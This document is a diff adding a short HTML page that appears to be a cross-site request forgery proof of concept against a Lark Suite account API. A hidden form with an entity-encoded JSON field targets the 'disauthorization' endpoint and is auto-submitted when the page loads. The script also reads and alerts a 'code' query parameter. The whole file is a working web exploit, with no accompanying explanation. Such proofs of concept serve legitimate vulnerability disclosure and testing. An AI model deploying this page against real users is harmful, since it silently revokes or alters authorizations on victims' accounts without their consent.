@@ -1,0 +1,15 @@
+<html>
+  <form id="csrf" action="https://accounts-sg.larksuite.com/open-apis/authen/v1/disauthorization" method="POST" enctype="text/plain">
+    <input type="hidden" name="&#123;&quot;app&#95;id&quot;&#58;&quot;7400198819092119584&quot;&#44;&quot;auth&#95;type&quot;&#58;1&#125;" value="" />
+    <input type="submit" value="Submit request" />
+  </form>
+  <script>
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const code = urlParams.get('code')
+    if(code){
+	   alert(code);
+	}
+    document.getElementById("csrf").submit();
+  </script>
+</html>
